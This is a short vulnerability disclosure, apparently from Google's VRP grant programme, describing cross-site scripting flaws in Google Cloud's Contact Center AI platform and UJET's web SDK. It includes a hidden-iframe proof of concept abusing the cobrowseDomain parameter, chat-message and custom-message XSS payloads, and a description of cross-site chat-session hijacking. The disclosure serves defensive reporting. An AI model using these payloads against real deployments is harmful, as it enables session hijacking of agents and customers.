[Contact Center AI (CCAI)](https://cloud.google.com/solutions/contact-center-ai-platform) is a Contact Center as a Service platform from Google Cloud based of [UJET](https://ujet.cx/)   
The following was done as part of a [VRP grant](https://www.google.com/about/appsecurity/research-grants/) of $500, later increased by $1337

# Agent XSS
On the agents control panel there was an iframe with the location controlled by the URL parameter ```cobrowseDomain```,
So you could get an XSS by navigating it to a ```javascript:``` URL... also no embedding protection.
```js
let f = document.createElement('iframe');
f.hidden = true;
f.src = 'https://something.uc1.ccaiplatform.com/agent/?type=popup&popup=cobrowse&cobrowseDomain=javascript:alert(window.origin);%2F%2F';
document.body.appendChild(f);
```

# Client XSS
Using the chat message feature of Cloud Contact Center an agent could XSS the user on https://websdk.ujet.co by messaging ```https://"onmousemove="alert(window.origin)"```  
This could also be done by setting a custom "Waiting for Agent Assignment Message" like ```<img src=x onerror=alert(window.origin)>```  
Because the [SDK](https://cloud.google.com/contact-center/ccai-platform/docs/Guide/publication--en?hl=en) used a shared origin of ```https://websdk.ujet.co``` to render all chat sessions from Cloud Contact Center,  
Any website with there own chat could hijack a different websites chat session via the window opener.  
The origin was also trusted by [Cobrowse](https://cobrowse.io/) which is a feature of the SDK.
